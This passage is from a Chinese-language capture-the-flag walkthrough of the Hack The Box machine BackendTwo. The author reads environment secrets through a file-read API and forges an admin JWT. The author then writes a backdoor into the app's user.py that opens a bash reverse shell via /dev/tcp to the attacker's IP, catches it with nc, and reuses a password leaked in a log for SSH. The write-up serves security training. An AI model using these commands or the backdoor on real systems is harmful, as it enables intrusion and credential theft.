+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220828094628194.png" srcset="/img/loading.gif" lazyload alt="image-20220828094628194"></p>
+<p>一路谷歌顺藤摸瓜摸索到源码&#x2F;home&#x2F;htb&#x2F;app&#x2F;core&#x2F;config.py。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> AnyHttpUrl, BaseSettings, EmailStr, validator</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Optional</span>, <span class="type">Union</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Settings</span>(<span class="title class_ inherited__">BaseSettings</span>):</span><br><span class="line">    API_V1_STR: <span class="built_in">str</span> = <span class="string">&quot;/api/v1&quot;</span></span><br><span class="line">    JWT_SECRET: <span class="built_in">str</span> = os.environ[<span class="string">&#x27;API_KEY&#x27;</span>]</span><br><span class="line">    ALGORITHM: <span class="built_in">str</span> = <span class="string">&quot;HS256&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 60 minutes * 24 hours * 8 days = 8 days</span></span><br><span class="line">    ACCESS_TOKEN_EXPIRE_MINUTES: <span class="built_in">int</span> = <span class="number">60</span> * <span class="number">24</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># BACKEND_CORS_ORIGINS is a JSON-formatted list of origins</span></span><br><span class="line">    <span class="comment"># e.g: &#x27;[&quot;http://localhost&quot;, &quot;http://localhost:4200&quot;, &quot;http://localhost:3000&quot;, \</span></span><br><span class="line">    <span class="comment"># &quot;http://localhost:8080&quot;, &quot;http://local.dockertoolbox.tiangolo.com&quot;]&#x27;</span></span><br><span class="line">    BACKEND_CORS_ORIGINS: <span class="type">List</span>[AnyHttpUrl] = []</span><br><span class="line"></span><br><span class="line"><span class="meta">    @validator(<span class="params"><span class="string">&quot;BACKEND_CORS_ORIGINS&quot;</span>, pre=<span class="literal">True</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">assemble_cors_origins</span>(<span class="params">cls, v: <span class="type">Union</span>[<span class="built_in">str</span>, <span class="type">List</span>[<span class="built_in">str</span>]]</span>) -&gt; <span class="type">Union</span>[<span class="type">List</span>[<span class="built_in">str</span>], <span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(v, <span class="built_in">str</span>) <span class="keyword">and</span> <span class="keyword">not</span> v.startswith(<span class="string">&quot;[&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> v.split(<span class="string">&quot;,&quot;</span>)]</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(v, (<span class="built_in">list</span>, <span class="built_in">str</span>)):</span><br><span class="line">            <span class="keyword">return</span> v</span><br><span class="line">        <span class="keyword">raise</span> ValueError(v)</span><br><span class="line"></span><br><span class="line">    SQLALCHEMY_DATABASE_URI: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="string">&quot;sqlite:///uhc.db&quot;</span></span><br><span class="line">    FIRST_SUPERUSER: EmailStr = <span class="string">&quot;root@ippsec.rocks&quot;</span>    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Config</span>:</span><br><span class="line">        case_sensitive = <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">settings = Settings()</span><br></pre></td></tr></table></figure>
+
+<p>它是从环境变量中读取API_KEY的。再尝试读取&#x2F;proc&#x2F;self&#x2F;environ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl -X <span class="string">&#x27;GET&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;http://10.10.11.162/api/v1/admin/file/L3Byb2Mvc2VsZi9lbnZpcm9u&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;accept: application/json&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQxNTI5LCJpYXQiOjE2NjE2NTAzMjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYTdkMWNjY2ItNjEzNC00ZjkxLWExMzUtMzNiNjZhMmQ2NTNiIn0.oMAp9euGXoknNfwl8YKkDa4jWOk8BbylF7V8X2WoWFY&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;USER=htb\u0000HOME=/home/htb\u0000OLDPWD=/\u0000PORT=80\u0000LOGNAME=htb\u0000JOURNAL_STREAM=9:18117\u0000APP_MODULE=app.main:app\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000INVOCATION_ID=ec98ffc73ac546b8a30f47a8d08cc16e\u0000LANG=C.UTF-8\u0000API_KEY=68b329da9893e34099c7d8ad5cb9c940\u0000HOST=0.0.0.0\u0000PWD=/home/htb\u0000&quot;</span>&#125;                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ </span><br></pre></td></tr></table></figure>
+
+<p>然后制作JWT令牌：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ python           </span><br><span class="line">Python <span class="number">3.10</span><span class="number">.5</span> (main, Jun  <span class="number">8</span> <span class="number">2022</span>, 09:<span class="number">26</span>:<span class="number">22</span>) [GCC <span class="number">11.3</span><span class="number">.0</span>] on linux</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> jwt</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>token = <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQxNTI5LCJpYXQiOjE2NjE2NTAzMjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYTdkMWNjY2ItNjEzNC00ZjkxLWExMzUtMzNiNjZhMmQ2NTNiIn0.oMAp9euGXoknNfwl8YKkDa4jWOk8BbylF7V8X2WoWFY&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>key = <span class="string">&quot;68b329da9893e34099c7d8ad5cb9c940&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>decoded = jwt.decode(token, key, [<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>decoded</span><br><span class="line">&#123;<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;access_token&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>: <span class="number">1662341529</span>, <span class="string">&#x27;iat&#x27;</span>: <span class="number">1661650329</span>, <span class="string">&#x27;sub&#x27;</span>: <span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;is_superuser&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;guid&#x27;</span>: <span class="string">&#x27;a7d1cccb-6134-4f91-a135-33b66a2d653b&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>decoded[<span class="string">&quot;debug&quot;</span>] = <span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>jwt.encode(decoded, key, <span class="string">&quot;HS256&quot;</span>)</span><br><span class="line"><span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQxNTI5LCJpYXQiOjE2NjE2NTAzMjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYTdkMWNjY2ItNjEzNC00ZjkxLWExMzUtMzNiNjZhMmQ2NTNiIiwiZGVidWciOnRydWV9.Go5OEgWxQ9S1n6lQkhY474uqNA74u9EOfn35kAJA-J8&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>但写入ssh还是报错，我猜测是ssh目录不存在。那我可能需要通过尝试将代码写入到服务器后端代码文件中，再人为的尝试访问从而达到代码执行的效果：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl -X <span class="string">&#x27;GET&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;http://10.10.11.162/api/v1/admin/file/L2hvbWUvaHRiL2FwcC9hcGkvdjEvZW5kcG9pbnRzL3VzZXIucHk&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;accept: application/json&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQxNTI5LCJpYXQiOjE2NjE2NTAzMjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYTdkMWNjY2ItNjEzNC00ZjkxLWExMzUtMzNiNjZhMmQ2NTNiIiwiZGVidWciOnRydWV9.Go5OEgWxQ9S1n6lQkhY474uqNA74u9EOfn35kAJA-J8&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;from typing import Any, Optional\nfrom uuid import uuid4\nfrom datetime import datetime\n\n\nfrom fastapi import APIRouter, Depends, HTTPException, Query, Request\nfrom fastapi.security import OAuth2PasswordRequestForm\nfrom sqlalchemy.orm import Session\n\nfrom app import crud\nfrom app import schemas\nfrom app.api import deps\nfrom app.models.user import User\nfrom app.core.security import get_password_hash\n\nfrom pydantic import schema\ndef field_schema(field: schemas.user.UserUpdate, **kwargs: Any) -&gt; Any:\n    if field.field_info.extra.get(\&quot;hidden_from_schema\&quot;, False):\n        raise schema.SkipField(f\&quot;&#123;field.name&#125; field is being hidden\&quot;)\n    else:\n        return original_field_schema(field, **kwargs)\n\noriginal_field_schema = schema.field_schema\nschema.field_schema = field_schema\n\nfrom app.core.auth import (\n    authenticate,\n    create_access_token,\n)\n\nrouter = APIRouter()\n\n@router.get(\&quot;/&#123;user_id&#125;\&quot;, status_code=200, response_model=schemas.User)\ndef fetch_user(*, \n    user_id: int, \n    db: Session = Depends(deps.get_db) \n    ) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Fetch a user by ID\n    \&quot;\&quot;\&quot;\n    result = crud.user.get(db=db, id=user_id)\n    return result\n\n\n@router.put(\&quot;/&#123;user_id&#125;/edit\&quot;)\nasync def edit_profile(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.UserUpdate,\n    user_id: int\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Edit the profile of a user\n    \&quot;\&quot;\&quot;\n    u = db.query(User).filter(User.id == token[&#x27;sub&#x27;]).first()\n    if token[&#x27;is_superuser&#x27;] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token[&#x27;sub&#x27;]).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return &#123;\&quot;result\&quot;: \&quot;true\&quot;&#125;\n        else:\n            raise HTTPException(status_code=400, detail=&#123;\&quot;result\&quot;: \&quot;false\&quot;&#125;)\n\n@router.put(\&quot;/&#123;user_id&#125;/password\&quot;)\nasync def edit_password(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.PasswordUpdate,\n    user_id: int\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Update the password of a user\n    \&quot;\&quot;\&quot;\n    u = db.query(User).filter(User.id == token[&#x27;sub&#x27;]).first()\n    if token[&#x27;is_superuser&#x27;] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token[&#x27;sub&#x27;]).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return &#123;\&quot;result\&quot;: \&quot;true\&quot;&#125;\n        else:\n            raise HTTPException(status_code=400, detail=&#123;\&quot;result\&quot;: \&quot;false\&quot;&#125;)\n\n@router.post(\&quot;/login\&quot;)\ndef login(db: Session = Depends(deps.get_db),\n    form_data: OAuth2PasswordRequestForm = Depends()\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Get the JWT for a user with data from OAuth2 request form body.\n    \&quot;\&quot;\&quot;\n    \n    timestamp = datetime.now().strftime(\&quot;%m/%d/%Y, %H:%M:%S\&quot;)\n    user = authenticate(email=form_data.username, password=form_data.password, db=db)\n    if not user:\n        with open(\&quot;auth.log\&quot;, \&quot;a\&quot;) as f:\n            f.write(f\&quot;&#123;timestamp&#125; - Login Failure for &#123;form_data.username&#125;\\n\&quot;)\n        raise HTTPException(status_code=400, detail=\&quot;Incorrect username or password\&quot;)\n    \n    with open(\&quot;auth.log\&quot;, \&quot;a\&quot;) as f:\n            f.write(f\&quot;&#123;timestamp&#125; - Login Success for &#123;form_data.username&#125;\\n\&quot;)\n\n    return &#123;\n        \&quot;access_token\&quot;: create_access_token(sub=user.id, is_superuser=user.is_superuser, guid=user.guid),\n        \&quot;token_type\&quot;: \&quot;bearer\&quot;,\n    &#125;\n\n@router.post(\&quot;/signup\&quot;, status_code=201)\ndef create_user_signup(\n    *,\n    db: Session = Depends(deps.get_db),\n    user_in: schemas.user.UserSignup,\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Create new user without the need to be logged in.\n    \&quot;\&quot;\&quot;\n\n    new_user = schemas.user.UserCreate(**user_in.dict())\n\n    new_user.guid = str(uuid4())\n\n    user = db.query(User).filter(User.email == new_user.email).first()\n    if user:\n        raise HTTPException(\n            status_code=400,\n            detail=\&quot;The user with this username already exists in the system\&quot;,\n        )\n    user = crud.user.create(db=db, obj_in=new_user)\n\n    return user\n&quot;</span>&#125;   </span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl http://<span class="number">10.10</span><span class="number">.11</span><span class="number">.162</span>/api/v1/admin/file/$(echo -n <span class="string">&quot;/home/htb/app/api/v1/endpoints/user.py&quot;</span> | base64) -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -d <span class="string">&#x27;&#123;&quot;file&quot;: &quot;from typing import Any, Optional\nfrom uuid import uuid4\nfrom datetime import datetime\n\n\nfrom fastapi import APIRouter, Depends, HTTPException, Query, Request\nfrom fastapi.security import OAuth2PasswordRequestForm\nfrom sqlalchemy.orm import Session\n\nfrom app import crud\nfrom app import schemas\nfrom app.api import deps\nfrom app.models.user import User\nfrom app.core.security import get_password_hash\n\nfrom pydantic import schema\ndef field_schema(field: schemas.user.UserUpdate, **kwargs: Any) -&gt; Any:\n    if field.field_info.extra.get(\&quot;hidden_from_schema\&quot;, False):\n        raise schema.SkipField(f\&quot;&#123;field.name&#125; field is being hidden\&quot;)\n    else:\n        return original_field_schema(field, **kwargs)\n\noriginal_field_schema = schema.field_schema\nschema.field_schema = field_schema\n\nfrom app.core.auth import (\n    authenticate,\n    create_access_token,\n)\n\nrouter = APIRouter()\n\n@router.get(\&quot;/&#123;user_id&#125;\&quot;, status_code=200, response_model=schemas.User)\ndef fetch_user(*, \n    user_id: int, \n    db: Session = Depends(deps.get_db) \n    ) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Fetch a user by ID\n    \&quot;\&quot;\&quot;\n    if user_id == -2222:\n        import os; os.system(&#x27;</span>\<span class="string">&#x27;&#x27;</span>bash -c \<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.2/1337 0&gt;&amp;1\&quot;&#x27;\&#x27;&#x27;)\n    result = crud.user.get(db=db, id=user_id)\n    return result\n\n\n@router.put(\&quot;/&#123;user_id&#125;/edit\&quot;)\nasync def edit_profile(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.UserUpdate,\n    user_id: int\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Edit the profile of a user\n    \&quot;\&quot;\&quot;\n    u = db.query(User).filter(User.id == token[&#x27;\&#x27;&#x27;sub&#x27;\&#x27;&#x27;]).first()\n    if token[&#x27;\&#x27;&#x27;is_superuser&#x27;\&#x27;&#x27;] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token[&#x27;\&#x27;&#x27;sub&#x27;\&#x27;&#x27;]).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return &#123;\&quot;result\&quot;: \&quot;true\&quot;&#125;\n        else:\n            raise HTTPException(status_code=400, detail=&#123;\&quot;result\&quot;: \&quot;false\&quot;&#125;)\n\n@router.put(\&quot;/&#123;user_id&#125;/password\&quot;)\nasync def edit_password(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.PasswordUpdate,\n    user_id: int\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Update the password of a user\n    \&quot;\&quot;\&quot;\n    u = db.query(User).filter(User.id == token[&#x27;\&#x27;&#x27;sub&#x27;\&#x27;&#x27;]).first()\n    if token[&#x27;\&#x27;&#x27;is_superuser&#x27;\&#x27;&#x27;] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token[&#x27;\&#x27;&#x27;sub&#x27;\&#x27;&#x27;]).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return &#123;\&quot;result\&quot;: \&quot;true\&quot;&#125;\n        else:\n            raise HTTPException(status_code=400, detail=&#123;\&quot;result\&quot;: \&quot;false\&quot;&#125;)\n\n@router.post(\&quot;/login\&quot;)\ndef login(db: Session = Depends(deps.get_db),\n    form_data: OAuth2PasswordRequestForm = Depends()\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Get the JWT for a user with data from OAuth2 request form body.\n    \&quot;\&quot;\&quot;\n    \n    timestamp = datetime.now().strftime(\&quot;%m/%d/%Y, %H:%M:%S\&quot;)\n    user = authenticate(email=form_data.username, password=form_data.password, db=db)\n    if not user:\n        with open(\&quot;auth.log\&quot;, \&quot;a\&quot;) as f:\n            f.write(f\&quot;&#123;timestamp&#125; - Login Failure for &#123;form_data.username&#125;\\n\&quot;)\n        raise HTTPException(status_code=400, detail=\&quot;Incorrect username or password\&quot;)\n    \n    with open(\&quot;auth.log\&quot;, \&quot;a\&quot;) as f:\n            f.write(f\&quot;&#123;timestamp&#125; - Login Success for &#123;form_data.username&#125;\\n\&quot;)\n\n    return &#123;\n        \&quot;access_token\&quot;: create_access_token(sub=user.id, is_superuser=user.is_superuser, guid=user.guid),\n        \&quot;token_type\&quot;: \&quot;bearer\&quot;,\n    &#125;\n\n@router.post(\&quot;/signup\&quot;, status_code=201)\ndef create_user_signup(\n    *,\n    db: Session = Depends(deps.get_db),\n    user_in: schemas.user.UserSignup,\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Create new user without the need to be logged in.\n    \&quot;\&quot;\&quot;\n\n    new_user = schemas.user.UserCreate(**user_in.dict())\n\n    new_user.guid = str(uuid4())\n\n    user = db.query(User).filter(User.email == new_user.email).first()\n    if user:\n        raise HTTPException(\n            status_code=400,\n            detail=\&quot;The user with this username already exists in the system\&quot;,\n        )\n    user = crud.user.create(db=db, obj_in=new_user)\n\n    return user\n\n&quot;</span>&#125;<span class="string">&#x27; -H &#x27;</span>Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQxNTI5LCJpYXQiOjE2NjE2NTAzMjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYTdkMWNjY2ItNjEzNC00ZjkxLWExMzUtMzNiNjZhMmQ2NTNiIiwiZGVidWciOnRydWV9.Go5OEgWxQ9S1n6lQkhY474uqNA74u9EOfn35kAJA-J8<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123;&quot;result&quot;:&quot;success&quot;&#125;   </span></span><br><span class="line"><span class="string">Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/-2222</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ nc -lvnp <span class="number">1337</span></span><br><span class="line">listening on [<span class="built_in">any</span>] <span class="number">1337</span> ...</span><br><span class="line">connect to [<span class="number">10.10</span><span class="number">.16</span><span class="number">.2</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">10.10</span><span class="number">.11</span><span class="number">.162</span>] <span class="number">51872</span></span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (<span class="number">681</span>): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">To run a command <span class="keyword">as</span> administrator (user <span class="string">&quot;root&quot;</span>), use <span class="string">&quot;sudo &lt;command&gt;&quot;</span>.</span><br><span class="line">See <span class="string">&quot;man sudo_root&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">htb@BackendTwo:~$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=<span class="number">1000</span>(htb) gid=<span class="number">1000</span>(htb) groups=<span class="number">1000</span>(htb),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">116</span>(lxd)</span><br><span class="line">htb@BackendTwo:~$ </span><br></pre></td></tr></table></figure>
+
+<p>还是老样子，留了个密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">htb@BackendTwo:~$ <span class="built_in">cat</span> auth.log </span><br><span class="line">08/27/2022, 23:27:50 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 23:31:10 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 23:44:30 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 23:47:50 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 23:52:50 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 23:56:10 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/28/2022, 00:09:30 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/28/2022, 00:17:50 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/28/2022, 00:19:30 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/28/2022, 00:26:10 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/28/2022, 00:34:30 - Login Failure <span class="keyword">for</span> 1qaz2wsx_htb!</span><br><span class="line">08/28/2022, 00:36:05 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/28/2022, 00:36:10 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/28/2022, 00:36:30 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/28/2022, 00:37:50 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/28/2022, 00:42:50 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/28/2022, 00:49:30 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/28/2022, 01:08:19 - Login Failure <span class="keyword">for</span> crazy@inside.htb</span><br><span class="line">08/28/2022, 01:08:45 - Login Success <span class="keyword">for</span> crazy@inside.htb</span><br><span class="line">08/28/2022, 01:29:45 - Login Success <span class="keyword">for</span> crazy@inside.htb</span><br><span class="line">08/28/2022, 01:32:08 - Login Success <span class="keyword">for</span> crazy@inside.htb</span><br></pre></td></tr></table></figure>
+
+<p>但是这次不能切换root.它是htb的密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ ssh htb@10.10.11.162                                             </span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.11.162 (10.10.11.162)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:hE6H4DrsHebfs+gclhz9SL77tMpy8aKR3vp8Y0NRDvY.</span></span><br><span class="line"><span class="string">This key is not known by any other names</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.11.162<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">htb@10.10.11.162&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-77-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check <span class="keyword">for</span> new updates run: sudo apt update</span><br><span class="line"></span><br><span class="line">To run a <span class="built_in">command</span> as administrator (user <span class="string">&quot;root&quot;</span>), use <span class="string">&quot;sudo &lt;command&gt;&quot;</span>.</span><br><span class="line">See <span class="string">&quot;man sudo_root&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">htb@BackendTwo:~$ </span><br></pre></td></tr></table></figure>
+
